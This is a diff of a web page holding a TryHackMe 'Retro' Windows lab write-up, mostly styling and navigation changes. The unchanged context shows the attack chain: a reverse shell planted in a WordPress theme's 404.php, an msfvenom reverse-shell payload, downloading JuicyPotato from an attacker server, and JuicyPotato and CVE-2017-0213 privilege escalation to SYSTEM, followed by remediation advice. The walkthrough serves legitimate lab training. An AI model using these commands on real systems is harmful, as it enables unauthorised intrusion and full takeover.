@@ -4,9 +4,10 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Retro — TryHackMe Writeup | Kun Poonkasetvatana</title>
-  <link rel="stylesheet" href="../style.css?v=4.0"/>
+  <link rel="stylesheet" href="../style.css?v=5.0"/>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700;800&family=Sarabun:wght@300;400;500;600&display=swap" rel="stylesheet"/>
 </head>
 <body class="writeup-page">
 
@@ -14,17 +15,18 @@
   <nav class="navbar">
     <div class="nav-inner">
       <a href="../index.html" class="nav-logo">
-        <span class="logo-accent">&gt;</span> Kun Poonkasetvatana
+        <span class="logo-badge">&gt;</span> Kun Poonkasetvatana
         <span class="logo-handle">(@OfflineDevc)</span>
       </a>
       <div class="nav-links">
-        <a href="../index.html">Home</a>
-        <a href="../index.html#writeups">All Writeups</a>
+        <a href="../index.html" class="nav-link-item">Home</a>
+        <a href="../index.html#writeups" class="nav-link-item active">Writeups</a>
+        <a href="../index.html#about" class="nav-link-item">About</a>
         <div class="nav-social-pills">
-          <a href="https://tryhackme.com/p/Distowel" target="_blank" rel="noopener" class="pill-social thm" title="TryHackMe Profile">THM</a>
-          <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank" rel="noopener" class="pill-social htb" title="HackTheBox Profile">HTB</a>
-          <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank" rel="noopener" class="pill-social in" title="LinkedIn Profile">IN</a>
-          <a href="https://github.com/OfflineDevc" target="_blank" rel="noopener" class="pill-social gh" title="GitHub Profile">GH</a>
+          <a href="https://tryhackme.com/p/Distowel" target="_blank" rel="noopener" class="pill-social" title="TryHackMe Profile">THM</a>
+          <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank" rel="noopener" class="pill-social" title="HackTheBox Profile">HTB</a>
+          <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank" rel="noopener" class="pill-social" title="LinkedIn Profile">IN</a>
+          <a href="https://github.com/OfflineDevc" target="_blank" rel="noopener" class="pill-social" title="GitHub Profile">GH</a>
         </div>
       </div>
     </div>
@@ -35,12 +37,11 @@
     <div class="writeup-hero-inner">
       <div class="hero-top-meta">
         <a href="../index.html#writeups" class="back-link">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-          All Writeups
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+          All Writeups Archive
         </a>
         <div class="author-hero-pill">
-          <span class="author-live-dot"></span>
-          <span>Author: <strong>Kun Poonkasetvatana</strong> (@OfflineDevc)</span>
+          <span>Author: <strong>Kun Poonkasetvatana</strong> (@OfflineDevc) · Published: 02 Nov 2026</span>
         </div>
       </div>
 
@@ -51,7 +52,7 @@
         </div>
         <div class="writeup-badges">
           <span class="badge diff-hard">Hard</span>
-          <span class="badge badge-os os-windows">Windows</span>
+          <span class="badge badge-os">Windows</span>
           <span class="badge badge-platform">TryHackMe</span>
         </div>
       </div>
@@ -64,131 +65,113 @@
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
       <span>Browse All Writeups</span>
     </button>
-    <span class="mobile-current-title">Retro (Windows)</span>
+    <span style="font-size: 13px; font-weight: 500; color: var(--text-secondary);">Retro (Windows)</span>
   </div>
 
   <!-- BACKDROP OVERLAY FOR MOBILE SIDEBAR -->
   <div class="sidebar-overlay" id="sidebarOverlay"></div>
 
-  <!-- MAIN TWO-COLUMN LAYOUT -->
+  <!-- MAIN THREE-COLUMN / TWO-COLUMN LAYOUT -->
   <div class="writeup-layout">
     <aside class="writeup-sidebar" id="sidebar">
-  <div class="sidebar-author-box">
-    <div class="sidebar-author-name">Kun Poonkasetvatana</div>
-    <div class="sidebar-author-meta">
-      <span class="author-badge-tag">@OfflineDevc</span>
-      <span class="author-badge-thm">THM: Distowel</span>
-    </div>
-  </div>
   <div class="sidebar-header">
-    <span class="sidebar-label">WRITEUPS ARCHIVE</span>
-    <span class="sidebar-count">11 ROOMS</span>
+    <span>WRITEUPS ARCHIVE</span>
+    <span>11 ROOMS</span>
   </div>
   <nav class="sidebar-menu">
-    <div class="sidebar-group group-easy">
+    <div class="sidebar-group">
       <div class="sidebar-group-header">
-        <div class="group-left"><span class="diff-indicator dot-easy"></span><span class="sidebar-group-name">EASY</span></div>
-        <span class="sidebar-group-badge pill-easy">1 ROOM</span>
+        <span>EASY</span>
+        <span class="badge diff-easy">1 ROOM</span>
       </div>
       <ul class="sidebar-list">
         <li class="sidebar-item">
-          <a href="skynet.html" class="sidebar-link" title="Skynet">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Skynet</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="skynet.html" title="Skynet">
+            <span>Skynet</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
       </ul>
     </div>
-    <div class="sidebar-group group-medium">
+    <div class="sidebar-group">
       <div class="sidebar-group-header">
-        <div class="group-left"><span class="diff-indicator dot-medium"></span><span class="sidebar-group-name">MEDIUM</span></div>
-        <span class="sidebar-group-badge pill-medium">6 ROOMS</span>
+        <span>MEDIUM</span>
+        <span class="badge diff-medium">6 ROOMS</span>
       </div>
       <ul class="sidebar-list">
         <li class="sidebar-item">
-          <a href="deaddrop.html" class="sidebar-link" title="Deaddrop">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Deaddrop</span>
-            <span class="sidebar-os-badge os-ad">Linux / AD</span>
+          <a href="deaddrop.html" title="Deaddrop">
+            <span>Deaddrop</span>
+            <span class="sidebar-os-badge">Linux / AD</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="domino.html" class="sidebar-link" title="Domino">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Domino</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="domino.html" title="Domino">
+            <span>Domino</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="forward.html" class="sidebar-link" title="Forward">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Forward</span>
-            <span class="sidebar-os-badge os-windows">Windows</span>
+          <a href="forward.html" title="Forward">
+            <span>Forward</span>
+            <span class="sidebar-os-badge">Windows</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="mrrobotctf.html" class="sidebar-link" title="Mr. Robot CTF">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Mr. Robot CTF</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="mrrobotctf.html" title="Mr. Robot CTF">
+            <span>Mr. Robot CTF</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="relevant.html" class="sidebar-link" title="Relevant">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Relevant</span>
-            <span class="sidebar-os-badge os-windows">Windows</span>
+          <a href="relevant.html" title="Relevant">
+            <span>Relevant</span>
+            <span class="sidebar-os-badge">Windows</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="silent-monitor.html" class="sidebar-link" title="Silent Monitor">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Silent Monitor</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="silent-monitor.html" title="Silent Monitor">
+            <span>Silent Monitor</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
       </ul>
     </div>
-    <div class="sidebar-group group-hard">
+    <div class="sidebar-group">
       <div class="sidebar-group-header">
-        <div class="group-left"><span class="diff-indicator dot-hard"></span><span class="sidebar-group-name">HARD</span></div>
-        <span class="sidebar-group-badge pill-hard">4 ROOMS</span>
+        <span>HARD</span>
+        <span class="badge diff-hard">4 ROOMS</span>
       </div>
       <ul class="sidebar-list">
         <li class="sidebar-item">
-          <a href="brainpan1.html" class="sidebar-link" title="Brainpan 1">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Brainpan 1</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="brainpan1.html" title="Brainpan 1">
+            <span>Brainpan 1</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="daily-bugle.html" class="sidebar-link" title="Daily Bugle">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Daily Bugle</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="daily-bugle.html" title="Daily Bugle">
+            <span>Daily Bugle</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="internal.html" class="sidebar-link" title="Internal">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Internal</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="internal.html" title="Internal">
+            <span>Internal</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item active">
-          <a href="retro.html" class="sidebar-link" title="Retro">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Retro</span>
-            <span class="sidebar-os-badge os-windows">Windows</span>
+          <a href="retro.html" title="Retro">
+            <span>Retro</span>
+            <span class="sidebar-os-badge">Windows</span>
           </a>
         </li>
       </ul>
     </div>
   </nav>
-  <div class="sidebar-footer">
-    <a href="../index.html#writeups" class="sidebar-home-link">
+  <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid var(--border-light);">
+    <a href="../index.html#writeups" class="back-link">
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
       <span>Back to Portfolio Grid</span>
     </a>
@@ -197,7 +180,7 @@
 
     <main class="writeup-main">
       <article class="writeup-content">
-<h2>1. Executive Summary &amp; Machine Overview</h2>
+<h2 id="1-executive-summary-amp-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
 <table>
 <thead>
 <tr>
@@ -237,7 +220,7 @@
 </tbody>
 </table>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113191414.png" /></p>
-<h3>Attack Chain Summary</h3>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
 <ol>
 <li><strong>Reconnaissance &amp; Credential Discovery</strong>:<br />
    - Enumerated web service on Port 80 and identified WordPress site under <code>/retro/</code>.<br />
@@ -261,8 +244,8 @@
    - Read root flag from <code>C:\Users\Administrator\Desktop\root.txt.txt</code>.</li>
 </ol>
 <hr />
-<h2>2. Phase 1: Reconnaissance &amp; Web Enumeration</h2>
-<h3>2.1 Port Scanning (Nmap)</h3>
+<h2 id="2-phase-1-reconnaissance-amp-web-enumeration">2. Phase 1: Reconnaissance &amp; Web Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
 <p>Scanning target <code>10.49.187.4</code>:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261111150319.png" /><br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261111150325.png" /></p>
@@ -270,7 +253,7 @@
 <li><strong>Port 80/tcp</strong>: Microsoft IIS httpd 10.0</li>
 <li><strong>Port 3389/tcp</strong>: Microsoft Terminal Services (RDP)</li>
 </ul>
-<h3>2.2 WordPress Directory &amp; Comment Enumeration</h3>
+<h3 id="22-wordpress-directory-amp-comment-enumeration">2.2 WordPress Directory &amp; Comment Enumeration</h3>
 <p>Browsing to <code>http://10.49.187.4/retro/</code>:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261111150412.png" /><br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261111150457.png" /><br />
@@ -280,8 +263,8 @@
 - <strong>Username</strong>: <code>wade</code><br />
 - <strong>Password</strong>: <code>********</code></p>
 <hr />
-<h2>3. Phase 2: Initial Foothold (WordPress Theme Editor RCE)</h2>
-<h3>3.1 Logging into WordPress Admin &amp; Editing 404.php</h3>
+<h2 id="3-phase-2-initial-foothold-wordpress-theme-editor-rce">3. Phase 2: Initial Foothold (WordPress Theme Editor RCE)</h2>
+<h3 id="31-logging-into-wordpress-admin-amp-editing-404php">3.1 Logging into WordPress Admin &amp; Editing 404.php</h3>
 <p>We log in to <code>http://10.49.187.4/retro/wp-login.php</code> as <code>wade:********</code>.<br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261111150527.png" /><br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261111150555.png" />We navigate to <strong>Appearance &gt; Theme Editor</strong>, select theme <strong>90s Retro</strong>, and edit <code>404.php</code>:</p>
@@ -304,7 +287,7 @@ if ($os === 'windows') {
 }
 ?&gt;
 </code></pre>
-<h3>3.2 Triggering Reverse Shell</h3>
+<h3 id="32-triggering-reverse-shell">3.2 Triggering Reverse Shell</h3>
 <p>We start our listener:</p>
 <pre><code class="language-bash">penelope nc -p 4444
 </code></pre>
@@ -319,8 +302,8 @@ We trigger the payload in the browser:</p>
 PS C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro&gt;
 </code></pre>
 <hr />
-<h2>4. Phase 3: Privilege Escalation via JuicyPotato</h2>
-<h3>4.1 Checking Token Privileges</h3>
+<h2 id="4-phase-3-privilege-escalation-via-juicypotato">4. Phase 3: Privilege Escalation via JuicyPotato</h2>
+<h3 id="41-checking-token-privileges">4.1 Checking Token Privileges</h3>
 <p>We inspect privileges with <code>whoami /priv</code>:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261111152931.png" /></p>
 <pre><code class="language-powershell">PS C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro&gt; whoami /priv
@@ -334,13 +317,13 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 </code></pre>
 <p><code>SeImpersonatePrivilege</code> is enabled, making the service account vulnerable to <strong>JuicyPotato</strong> token impersonation.</p>
-<h3>4.2 Downloading JuicyPotato</h3>
+<h3 id="42-downloading-juicypotato">4.2 Downloading JuicyPotato</h3>
 <p>We host <code>JuicyPotato.exe</code> on our Python web server (<code>http://192.168.132.94:8000/JuicyPotato.exe</code>) and download it onto the target:</p>
 <pre><code class="language-powershell">Invoke-WebRequest -Uri &quot;http://192.168.132.94:8000/JuicyPotato.exe&quot; -o C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro\JuicyPotato.exe
 dir
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261111162908.png" /></p>
-<h3>4.3 Generating Payload &amp; Starting Listener</h3>
+<h3 id="43-generating-payload-amp-starting-listener">4.3 Generating Payload &amp; Starting Listener</h3>
 <p>On our Kali machine, we generate a Windows reverse shell executable on port 4445:</p>
 <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4445 -f exe -o payload.exe
 </code></pre>
@@ -349,7 +332,7 @@ dir
 <pre><code class="language-bash">penelope nc -p 4445
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261111164053.png" /></p>
-<h3>4.4 Triggering JuicyPotato &amp; Obtaining SYSTEM</h3>
+<h3 id="44-triggering-juicypotato-amp-obtaining-system">4.4 Triggering JuicyPotato &amp; Obtaining SYSTEM</h3>
 <p>We run <code>JuicyPotato.exe</code> targeting CLSID <code>{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</code>:</p>
 <pre><code class="language-powershell">.\JuicyPotato.exe -l 4445 -p payload.exe -t * -c &quot;{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}&quot;
 </code></pre>
@@ -363,7 +346,7 @@ dir
 <pre><code class="language-cmd">C:\Windows\system32&gt;whoami
 nt authority\system
 </code></pre>
-<h3>4.5 Retrieving Root Flag</h3>
+<h3 id="45-retrieving-root-flag">4.5 Retrieving Root Flag</h3>
 <p>We read the root flag located at <code>C:\Users\Administrator\Desktop\root.txt.txt</code>:</p>
 <pre><code class="language-cmd">C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt.txt
 ********************************
@@ -373,9 +356,9 @@ nt authority\system
 <li><strong>Root Flag</strong>: <code>********************************</code></li>
 </ul>
 <hr />
-<h2>5. Alternative Path: FreeRDP &amp; CVE-2017-0213</h2>
+<h2 id="5-alternative-path-freerdp-amp-cve-2017-0213">5. Alternative Path: FreeRDP &amp; CVE-2017-0213</h2>
 <p>An alternative exploitation route utilizes direct Remote Desktop (RDP) access using Wade's credentials:</p>
-<h3>5.1 Connecting via FreeRDP &amp; User Flag</h3>
+<h3 id="51-connecting-via-freerdp-amp-user-flag">5.1 Connecting via FreeRDP &amp; User Flag</h3>
 <p>We connect to <code>10.49.187.4</code> using FreeRDP:</p>
 <pre><code class="language-bash">xfreerdp /v:10.49.187.4 /u:wade /p:********
 </code></pre>
@@ -383,7 +366,7 @@ nt authority\system
 <p>On Wade's desktop, <code>user.txt</code> is retrieved (<code>********************************</code>):</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261111161637.png" /></p>
 <p>System information verifies <strong>Windows Server 2016 Standard, Version 1607, OS Build 14393.0</strong>.</p>
-<h3>5.2 Downloading &amp; Running CVE-2017-0213 Exploit</h3>
+<h3 id="52-downloading-amp-running-cve-2017-0213-exploit">5.2 Downloading &amp; Running CVE-2017-0213 Exploit</h3>
 <p>We host <code>CVE-2017-0213_x64.zip</code> on our attacker HTTP server:</p>
 <pre><code class="language-bash">python3 -m http.server 8000
 </code></pre>
@@ -402,7 +385,7 @@ nt authority\system
 <li><strong>Root Flag Confirmed via Alternative Path!</strong> (<code>********************************</code>)</li>
 </ul>
 <hr />
-<h2>6. Security Mitigations &amp; Remediation</h2>
+<h2 id="6-security-mitigations-amp-remediation">6. Security Mitigations &amp; Remediation</h2>
 <table>
 <thead>
 <tr>
@@ -435,7 +418,7 @@ nt authority\system
 </tbody>
 </table>
 <hr />
-<h2>7. Tools Used</h2>
+<h2 id="7-tools-used">7. Tools Used</h2>
 <ul>
 <li><strong>Nmap</strong>: Port and service enumeration</li>
 <li><strong>Penelope / Netcat</strong>: Reverse shell listener handling</li>
@@ -449,38 +432,63 @@ nt authority\system
       <!-- PREV / NEXT NAVIGATION -->
       
     <nav class="writeup-pagination">
-      <a href="internal.html" class="pagination-card prev-card">
+      <a href="internal.html" class="pagination-card">
         <span class="pagination-sub">← PREVIOUS WRITEUP</span>
         <span class="pagination-title">Internal</span>
         <div class="pagination-badges-row">
-          <span class="pagination-badge diff-hard">Hard</span>
-          <span class="pagination-badge badge-os">Linux</span>
+          <span class="pagination-badge">Hard</span>
+          <span class="pagination-badge">Linux</span>
         </div>
       </a>
-      <a href="skynet.html" class="pagination-card next-card">
+      <a href="skynet.html" class="pagination-card" style="text-align: right;">
         <span class="pagination-sub">NEXT WRITEUP →</span>
         <span class="pagination-title">Skynet</span>
-        <div class="pagination-badges-row">
-          <span class="pagination-badge diff-easy">Easy</span>
-          <span class="pagination-badge badge-os">Linux</span>
+        <div class="pagination-badges-row" style="justify-content: flex-end;">
+          <span class="pagination-badge">Easy</span>
+          <span class="pagination-badge">Linux</span>
         </div>
       </a>
     </nav>
     
     </main>
+
+    <aside class="toc-sidebar">
+  <div class="toc-title">ON THIS PAGE</div>
+  <ul class="toc-menu">
+    <li><a href="#1-executive-summary-amp-machine-overview" class="toc-link">1. Executive Summary &amp; Machine Overview</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#attack-chain-summary" class="toc-link">Attack Chain Summary</a></li>
+    <li><a href="#2-phase-1-reconnaissance-amp-web-enumeration" class="toc-link">2. Phase 1: Reconnaissance &amp; Web Enumeration</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#21-port-scanning-nmap" class="toc-link">2.1 Port Scanning (Nmap)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#22-wordpress-directory-amp-comment-enumeration" class="toc-link">2.2 WordPress Directory &amp; Comment Enumeration</a></li>
+    <li><a href="#3-phase-2-initial-foothold-wordpress-theme-editor-rce" class="toc-link">3. Phase 2: Initial Foothold (WordPress Theme Editor RCE)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#31-logging-into-wordpress-admin-amp-editing-404php" class="toc-link">3.1 Logging into WordPress Admin &amp; Editing 404.php</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#32-triggering-reverse-shell" class="toc-link">3.2 Triggering Reverse Shell</a></li>
+    <li><a href="#4-phase-3-privilege-escalation-via-juicypotato" class="toc-link">4. Phase 3: Privilege Escalation via JuicyPotato</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#41-checking-token-privileges" class="toc-link">4.1 Checking Token Privileges</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#42-downloading-juicypotato" class="toc-link">4.2 Downloading JuicyPotato</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#43-generating-payload-amp-starting-listener" class="toc-link">4.3 Generating Payload &amp; Starting Listener</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#44-triggering-juicypotato-amp-obtaining-system" class="toc-link">4.4 Triggering JuicyPotato &amp; Obtaining SYSTEM</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#45-retrieving-root-flag" class="toc-link">4.5 Retrieving Root Flag</a></li>
+    <li><a href="#5-alternative-path-freerdp-amp-cve-2017-0213" class="toc-link">5. Alternative Path: FreeRDP &amp; CVE-2017-0213</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#51-connecting-via-freerdp-amp-user-flag" class="toc-link">5.1 Connecting via FreeRDP &amp; User Flag</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#52-downloading-amp-running-cve-2017-0213-exploit" class="toc-link">5.2 Downloading &amp; Running CVE-2017-0213 Exploit</a></li>
+    <li><a href="#6-security-mitigations-amp-remediation" class="toc-link">6. Security Mitigations &amp; Remediation</a></li>
+    <li><a href="#7-tools-used" class="toc-link">7. Tools Used</a></li>
+  </ul>
+</aside>
   </div>
 
   <!-- FOOTER -->
   <footer class="footer">
     <div class="footer-inner">
-      <p class="footer-author">Security Portfolio of <strong>Kun Poonkasetvatana</strong> (@OfflineDevc)</p>
-      <p class="footer-copy">Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+      <p style="font-weight: 600; color: var(--text-main); margin-bottom: 6px;">Security Research &amp; Writeups Archive</p>
+      <p class="footer-copy">Built with classic minimalist design by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
          <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
          <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a> · 
          <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
     </div>
   </footer>
 
-  <script src="../script.js?v=4.0"></script>
+  <script src="../script.js?v=5.0"></script>
 </body>
 </html>
